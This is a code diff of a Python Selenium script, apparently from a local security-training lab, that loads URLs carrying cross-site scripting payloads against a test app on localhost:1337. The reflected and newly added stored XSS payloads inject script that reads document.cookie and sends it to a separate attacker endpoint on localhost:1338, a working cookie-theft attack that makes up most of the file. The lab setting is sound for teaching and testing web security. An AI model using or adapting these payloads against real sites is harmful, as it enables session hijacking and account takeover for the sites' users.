@@ -10,10 +10,11 @@ ATTACKER_SERVER_ENDPOINT = 'http://localhost:1338'
 
 def xss(vuln_type, level):
     # TODO remove this if statement
-    if(vuln_type != '1'):
+    if(vuln_type != '2'):
         return
     if(level != 'low' and level != 'medium' and level != 'high'):
         return
+    print("SENDING REQUEST")
     options = Options()
     options.add_argument("--headless")
     driver = webdriver.Firefox(options=options) # Starts the browser
@@ -22,7 +23,7 @@ def xss(vuln_type, level):
 
     # DO SOMETHING
 
-    # Low Reflected XSS
+    # Reflected XSS
     if vuln_type == '1' and level == 'low':
         url = "http://localhost:1337/xss/1/low?comment=%22%3Cscript%3Evar%20cookie=document.cookie;$.ajax({url:%20%22http://localhost:1338/xss/reflected_low?cookie=%22.concat(cookie)});%3C/script%3E%22"
         driver.get(url)
@@ -33,7 +34,12 @@ def xss(vuln_type, level):
         url = "http://localhost:1337/xss/1/high?comment=%3CBODY%20ONLOAD=$.ajax({url:%22http://localhost:1338/xss/reflected_high?cookie=%22.concat(document.cookie)})%3E"
         driver.get(url)
 
-    if vuln_type == '1' and level == 'medium':
+    # Stored XSS
+    print(level)
+    if vuln_type == '2' and level == 'low':
+        url = "http://localhost:1337/xss/2/low?comment=%22%3Cscript%3E$.ajax({url:%22http://localhost:1338/xss/stored_low?cookie=%22.concat(document.cookie)});%3C/script%3E%22"
+        driver.get(url)
+    elif vuln_type == '2' and level == 'medium':
         pass
 
 
